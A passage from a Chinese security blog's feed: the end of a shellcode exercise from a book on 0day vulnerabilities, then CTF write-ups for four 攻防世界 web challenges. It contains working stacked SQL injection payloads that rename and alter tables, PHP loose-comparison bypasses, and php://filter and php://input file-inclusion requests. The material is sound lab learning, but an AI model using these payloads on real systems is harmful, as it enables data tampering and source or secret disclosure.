src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-11-28_10-25-41.png"></p><p>然后编写shellcode：这里笔者花了大量的时间来写shellcode，</p><p><strong>第一个问题是一开始没有调高栈顶，也就是没有对rsp进行修改，导致运行时新入栈的值淹没了我的shellcode，所以调高了栈顶</strong></p><p><strong>第二个问题是发现无法在堆栈中执行命令，尝试在系统中关闭了DEP，但是还是不行，然后在调试器中，右键转到内存，然后右键该区域，内存权限，修改为可执行权限即可</strong></p><p><strong>第三个问题是发现64位的地址中会有0x00，不可避免，选择使用逻辑移位的方式构造跳转地址。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SUB rsp,64;调高栈顶，防止栈帧破坏shellcode<br>XORebx,ebx;得0<br>PUSHebx<br>MOV rax,0x3378736830726521;!er0hsx3<br>PUSHrax<br>MOVrax,rsp;将字符串指针给rax<br>PUSHebx;压入函数参数<br>PUSHrax<br>PUSHrax<br>PUSHebx<br>MOVrax,0x7FFB294DA0;防止0x00被截断，使用移位的方式构造函数地址<br>SHLrax,24<br>SHRrax,16<br>CALLrax;call MessageBoxA<br>ADDrsp,64;回收栈顶<br></code></pre></td></tr></table></figure><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-06-05.png"></p><p>·<img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-21-16.png"></p><p>右键修改可执行权限</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-22-12.png"></p><p>全选然后设置权限</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-23-02.png"></p><p>发现已经执行到MessageBoxA函数处😁：</p><p><img src="/2023/12/02/0Day%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%AC%AC2%E7%89%88%E9%98%85%E8%AF%BB%E9%9A%8F%E7%AC%942/Snipaste_2023-12-01_21-24-55.png"></p><p>最后一个问题没有解决！为什么不弹窗！为什么！😅</p><p>第二章就结束了，虽然最后有个小遗憾，但是笔者已经花了大量的时间动手去完成任务，并且效果还不错，所以就不纠结于弹窗了哈哈😀</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>软件与系统安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF-攻防世界-WEB-WP</title>
    <link href="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/"/>
    <url>/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/</url>
    
    <content type="html"><![CDATA[<p>好久没有做过web了，偶然翻到之前笔者曾经做过的一些攻防世界-WEB题目写的题解🐸，本人菜鸡一个😭😭😭😭</p><span id="more"></span><h4 id="1-PHP2"><a href="#1-PHP2" class="headerlink" title="1_PHP2"></a>1_PHP2</h4><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p>打开只有一个显示，“Can you anthenticate to this website?”，检查源代码也没有其他显示。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp1.jpg"></p><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p>- </p><p>  <strong>phps文件就是php的源代码文件</strong>，通常用于提供给用户（访问者）直接通过Web浏览器查看php代码的内容。因为用户无法直接通过Web浏览器“看到”php文件的内容，所以需要用phps文件代替。</p><ul><li>浏览器在将请求传回服务端时会对url解码一次后传回。</li></ul><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>首先访问index.php，回显没有变化。试着访问源码phps文件index.phps，发现源码</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp2.jpg"></p><p>源码分析：当输入url中输入id&#x3D;admin时，echo“not allowed!”，不是想要的结果。</p><p>我们发现浏览器会对url解码一次，然后urldecode再对url解码一次，相当于对url解码了两次，所以我们再url后跟的应该有url编码两次后的字符，查表，将字符a写为%25%36%31，浏览器解码一次后变为%61，再经过urlencode解码一次后为a，通过检验。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp3.jpg"></p><h4 id="2-EasyPHP"><a href="#2-EasyPHP" class="headerlink" title="2_EasyPHP"></a>2_EasyPHP</h4><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>直接进入，发现php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$key1</span> = <span class="hljs-number">0</span>;<br><span class="hljs-variable">$key2</span> = <span class="hljs-number">0</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>) &gt; <span class="hljs-number">6000000</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$a</span>) &lt;= <span class="hljs-number">3</span>)&#123;      <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>) &amp;&amp; <span class="hljs-string">&#x27;8b184b&#x27;</span> === <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>),-<span class="hljs-number">6</span>,<span class="hljs-number">6</span>))&#123;<br>        <span class="hljs-variable">$key1</span> = <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...再想想&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Emmm...&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$c</span>=(<span class="hljs-keyword">array</span>)<span class="hljs-title function_ invoke__">json_decode</span>(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>]) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;m&quot;</span>] &gt; <span class="hljs-number">2022</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]) == <span class="hljs-number">2</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>][<span class="hljs-number">0</span>]))&#123;<br>        <span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br>        <span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no...&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>            <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;DGGJ&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no......&quot;</span>):<span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-variable">$key2</span> = <span class="hljs-number">1</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$key1</span> &amp;&amp; <span class="hljs-variable">$key2</span>)&#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Hgfks.php&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You&#x27;re right&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>PHP substr函数：substr(<em>string,start,length</em>)</p><p>start：规定何处开始，<strong>可以是负数</strong>，表明在从<strong>字符串结尾</strong>的指定位置开始，-2表示从倒数第二个开始。</p></li><li><p>&#x3D;&#x3D;<strong>PHP 中字符串与数值比较的陷阱</strong>&#x3D;&#x3D;：</p><ul><li>当两个字符比较时，就是比较他们的ASCII码</li><li>两个字符串进行比较时，是从第一位开始比较其ASCII码，只要有一位出现了 差异，就返回比较结果。</li><li>当字符串与数字比较时，<strong>首先系统尝试将此字符串&#x2F;字符转换为整型&#x2F;浮点型</strong>，然后进行比较，如**’12bsd’转型为12<strong>，</strong>‘a’转型为0<strong>，千万需要注意的是此时不是将其对应的ASCII码值与数字进行大小比较了。其实同样的道理，’a’+10结果也是10。并且容易忽略的：</strong>0 与任意不可转化为数字的字符串比较(操作符为双等时。即松散比较), 均返回 true。**</li></ul></li></ul><h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>​        直接看到代码尾部有一个Hgfks.php，试着直接访问，发现不行，又访问Hgfks.phps，也不行，好吧，阅读前面的代码。首先从地址栏读取了a,b两个参数，第一个函数是if判断是检验a,b的值是否符合要求，首先对a，有个<strong>intval函数</strong>，将任意类型转为int型，然后这个值要大于6000000，且a的长度不超过3个字符。那么可以用9e9这种方式传入。再看b，<strong>是要b的MD5码的最后6位等于给定输入，尝试用bp爆破，也可以写python脚本碰撞</strong>。得到53724为b的值。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp4.jpg"></p><p>继续阅读代码，发现有c作为值，试着绕过c，首先有一个json_decode(@$_GET[‘c’])，说明要c是post，json格式的数据，提交形式c&#x3D;{}，首先有一个m，m&gt;2022&amp;&amp;m不是数字，那么我们想到PHP中的松散比较，m不是数字，那么必然是字符串，<strong>字符串于数值比较时，如果包含数字，则尝试先转为只保留数字，如果不包含数字，则转为0，</strong>所以我们这里会有c&#x3D;{“m”:20222a}，m已经通过，向下走，发现c中还有一个变量n，首先n是一个数组，然后count()&#x3D;2，说明其有两个元素。</p><p>那么修改c的形式c&#x3D;{“m”:”20222a”,”n”:[]}，可以发现出现了no hack字样，说明我们已经绕过了m的验证，然后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>][<span class="hljs-number">0</span>])<br></code></pre></td></tr></table></figure><p>说明n的第一个元素要为数组，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">array_search</span>(<span class="hljs-string">&quot;DGGJ&quot;</span>, <span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>]);<br><span class="hljs-variable">$d</span> === <span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no...&quot;</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$c</span>[<span class="hljs-string">&quot;n&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>    <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;DGGJ&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no......&quot;</span>):<span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里是说明n中要包含DGGJ，又不能包含DGGJ，很神奇，这里要解决的话，我们应该想到PHP中比较常见的比较陷阱，array_search的本质是将需要查找的字符串与数组内的元素进行比较，所以我们写0的话是不是就可以绕过这个查询了呢（0在比较中的特殊性），我们可以这样写了c&#x3D;{“m”:”22222a”,”m”:[[0,1],0]}，然后try一下，答案来了。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp5.jpg"></p><h4 id="3-SuperSQLi"><a href="#3-SuperSQLi" class="headerlink" title="3_SuperSQLi"></a>3_SuperSQLi</h4><h5 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h5><p>进入环境后出现一个查询框，如下图</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp6.jpg"></p><p>题目已经告诉了这是一道sql注入题，所以直接使用sql注入解题。</p><h5 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p><strong>&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;<strong>：Stacked injections(堆叠注入)从名词的含义就可以看到应该是</strong>一堆 sql 语句(多条)一起执行</strong>。在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句。因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间在于<strong>union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。</strong>但是堆叠查询并不是每个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>一般的拼接形式为: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show .....</span><br><span class="hljs-string">=1&#x27;</span>;<span class="hljs-keyword">drop</span> .....<br><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;;rename ...</span><br></code></pre></td></tr></table></figure></li><li><p><strong>SQL的一些表相关的DDL语句知识：</strong></p><ul><li><pre><code class="sql">show tables; #打印当前所有表<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```sql<br>  show columns from `tablename`;#展示指定表的所有字段<br></code></pre></td></tr></table></figure></code></pre></li><li><pre><code class="sql">alter table `ss` rename to `S`;-- 修改表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-operator">-</span> ```<span class="hljs-keyword">sql</span><br>  <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `S` change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>); <span class="hljs-comment">-- 修改表中字段名和字段类型  </span><br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>首先，使用常用的SQL注入测试，注入’or 1&#x3D;1，出现了新的回显，就是输入不同的id返回的值，并且只有1，2，114514有不同的返回值，但好像暂时并没有什么用。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp8.jpg"></p><p>然后使用union联查，**’union select * from supersqli;当然是测试题目名构成的表啦，说不定就中了呢。**当然这里没中，回显表明后端进行了一定的过滤。像select、update都被ban掉了，但是show没有被ban掉，可以尝试打印。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp9.jpg"></p><p><strong>我们show一下databases，发现出现了回显，显示了当前DBMS中管理的数据库</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp10.jpg"></p><p>发现了supersqli，合理推测这是题目使用的数据库，我们继续查看一下包含的表，<strong>show tables</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp11.jpg"></p><p>发现当前使用的有两张表，1919810931114514和words，show columns from打印两张表的字段看看。</p><p>words表里的内容如下图，<strong>包含id和data，非常有可能是题目查询使用的表，因为我们输入的是id的值，返回给我们data的内容</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;show columns from `word`</span><br><span class="hljs-string">--注意字符串作为表名使用时应该带有反引号`</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp12.jpg"></p><p><strong>1919810931114514表里的内容，包含flag，这应该就是我们需要的东西了，问题现在转到了如何让题目查询1919…这张表。</strong></p><p>使用的注入语句是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;show columns from `1919810931114514`;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp13.jpg"></p><p><strong>我们这里采用修改表名的方式修改查询对象，</strong></p><p><strong>1’;alter table words rename to word;</strong></p><p><strong>没有报错，我们再次查询一下发现，已经找不到原来的表了，也验证了前面猜测这是题目所用的那张表。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp15.jpg"></p><p>**&#x3D;&#x3D;但是这里出现了一个问题，当我们像修改另一张表的名字时，同样也会报错，为什么呢，因为现在已经找不到words表了，id字段不能被注入了，所以我们应该同时修改两张表，而且同时要修改新的words表的flag字段为id&#x3D;&#x3D;**，也就是这样写：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;alter table `words` rename to `word`;alter table `1919810931114514` rename to `words`;alter table words change flag id varchar(100);</span><br></code></pre></td></tr></table></figure><p>那么我们再用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;or 1=1;</span><br></code></pre></td></tr></table></figure><p>即可得到答案。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/web_wp16.jpg"></p><h4 id="4-CTF-fileinclude-1"><a href="#4-CTF-fileinclude-1" class="headerlink" title="4_CTF_fileinclude_1"></a>4_CTF_fileinclude_1</h4><h5 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h5><p>进入环境直接一段PHP代码，且是文件上传相关，先去学习一下PHP文件上传相关知识。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">WRONG WAY! <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file1&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file2&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$file1</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file1&quot;</span>];<br>    <span class="hljs-variable">$file2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file2&quot;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file1</span>) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file2</span>))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file2</span>) === <span class="hljs-string">&quot;hello ctf&quot;</span>)<br>        &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file1</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h5><ul><li><p>**&#x3D;&#x3D;PHP伪协议&#x3D;&#x3D;**：参考文章<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><ul><li><p><strong>php:&#x2F;&#x2F;协议</strong>，访问各个IO流，CTF中常用php:&#x2F;&#x2F;filter（用于读取源码）和php:&#x2F;&#x2F;input（执行php代码）</p></li><li><p><strong>php:&#x2F;&#x2F;filer，</strong>(&gt;&#x3D;5.0.0)一种元封装器，设计<strong>用于数据流打开时的筛选过滤</strong>应用。对于一体式<code>（all-in-one）</code>的<strong>文件函数非常有用</strong>，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</p><ul><li>resource参数：传入要过滤的数据流</li><li>read参数：可选，可以设定多个过滤器名称</li><li>write参数：可选，可以设定多个过滤器名称</li><li>一个样例：test&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;info.php</li></ul></li><li><p><strong>php:&#x2F;&#x2F;input</strong>，假如我们post了一个data，则使用input可以读取这个data，所以在url请求头中可以使用input进行传参。同时，可以post一段php代码，让input去执行</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">..../?id=1&amp;&amp;name=php://input<br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>PHP include&#x2F;require函数：</strong>如果 include&#x2F;require 出现于调用文件中的一个函数里，则<strong>被调用的文件中所包含的所有代码将表现得如同它们是在该函数内部定义的一样</strong>。所以它将遵循该函数的变量范围。此规则的一个例外是魔术常量，它们是在发生包含之前就已被解析器处理的。include在所包含文件找不到时会继续执行之后的代码，而require会报错。</p></li><li><p><strong>Base64编码流程：base64常以&#x3D;号结尾</strong></p><ul><li>1.将所有字符转为8位二进制的ASCII码</li><li>2.将8位二进制3个归为一组，共计24位，再拆分为4组，每组6位（$2^6&#x3D;64$）</li><li>3.将获得的6位二进制转为10进制</li><li>4.从Base64编码表获取对应的编码</li><li><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_1.jpg"></li></ul></li><li><p><strong>对于不足6位的补零（图中浅红色的4位），索引为“A”；对于最后不足3字节，进行补零处理（图中红色部分），以“&#x3D;”替代，因此，“ABCD”的base64编码为：“QUJDRA&#x3D;&#x3D;”。</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_2.jpg"></p></li></ul><h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>代码有一句include(“flag.php”)，引入了一个文件，我们合理地猜测flag是包含在flag.php中的，所以我们先访问一下flag.php，发现只打印了一句，并没有flag，说明flag可能在文件的注释里。然后有两个参数，说明我们需要在url中传入file1和file2两个参数。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_5.jpg"></p><p>于是我们合理地想到可以使用文件过滤，将flag.php中地源码提取出来，原因是在第二层的if语句中有</p><p><code>include($file1);</code>，于是我们的url中file1可以这样编写：<code>file1=php://filter/read=convert.base64-encode/resource=flag.php</code>；然后考虑file2，我们先使用hackbar尝试一下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=hello ctf<br></code></pre></td></tr></table></figure><p>发现报错，因为<strong>有个file_get_contents函数，file2输入得是个文件才行</strong>，但是现在我们没有其他的文件可以输入。</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_6.jpg"></p><p>在hackbar里提交如下url，且在post中提交hello ctf，这里hackbar提交不了，选择使用BP提交，先在hackbar里execute，然后再BP里抓包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:56963/?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;&amp;file2=php://input<br></code></pre></td></tr></table></figure><p>如下，<strong>注意修改content-length</strong></p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_3.jpg"></p><p>得到一个base64编码，然后去解码即可</p><p><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/CTF_fileinclude_1_4.jpg"></p><h4 